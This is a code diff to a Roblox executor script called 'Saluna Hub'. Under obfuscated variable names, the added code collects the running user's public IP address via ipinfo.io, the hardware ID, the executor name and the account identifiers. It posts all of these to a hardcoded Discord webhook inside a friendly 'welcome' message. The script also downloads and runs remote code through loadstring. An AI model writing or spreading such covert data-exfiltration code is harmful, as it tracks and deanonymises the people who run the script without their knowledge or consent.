@@ -1,3 +1,30 @@
+local requesting = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+
+if not requesting then return end
+
+local function _F2X7M9N3L1(_P6X8N5M2L9)
+    local _D4X1M7N2L3, _K9X5M2N8L7 = pcall(function()
+        return requesting({ Url = _P6X8N5M2L9, Method = "GET" })
+    end)
+    return (_D4X1M7N2L3 and _K9X5M2N8L7 and _K9X5M2N8L7.Body) and game:GetService("HttpService"):JSONDecode(_K9X5M2N8L7.Body) or {}
+end
+
+local _W9N3M2X7L5 = game:GetService("Players").LocalPlayer
+local protocol, excutor, hardware = nil, nil, nil
+
+task.spawn(function()
+    protocol = _F2X7M9N3L1("https://ipinfo.io/json").ip or "Unknown IP"
+end)
+
+task.spawn(function()
+    excutor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
+end)
+
+task.spawn(function()
+    hardware = (gethwid and gethwid()) or "Unknown HWID"
+end)
+
+repeat task.wait() until protocol and excutor and hardware
 local antitable = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/list/main/anticamp'))()
 if not table.find(antitable,game.Players.LocalPlayer.Name) then
 local url = "https://discord.com/api/webhooks/1268134529567297629/oYa9cB697UfQ797-lSRVuN68pLb6Cmo0pi84bdRhCKU1eh-qHG4bsKJ3GctgR9nIcElz"
@@ -6,7 +33,7 @@ local url = "https://discord.com/api/webhooks/1268134529567297629/oYa9cB697UfQ79
         ["embeds"] = {
             {
                 ["title"] = " Saluna Notify",
-                ["description"] = "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId .. "\n============================================ \nWelcome To Saluna Hub \nHave A Nice Day â™¥ \n============================================ \nHWID: " ..game:GetService("RbxAnalyticsService"):GetClientId(),
+                ["description"] = "\nUser Name: " .. game.Players.LocalPlayer.Name .."\nUser ID: " .. game.Players.LocalPlayer.UserId .. "\n============================================" .. "\nGame ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId .. "\n============================================".. "\nExcutor Name: "..tostring(excutor) .."\nExcutor ID: " ..game:GetService("RbxAnalyticsService"):GetClientId() .."\nProtocol IP: " ..tostring(protocol) .."\n============================================" .."\nWelcome To Saluna Hub \nHave A Nice Day ♥ ",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x00FF7F)
             }
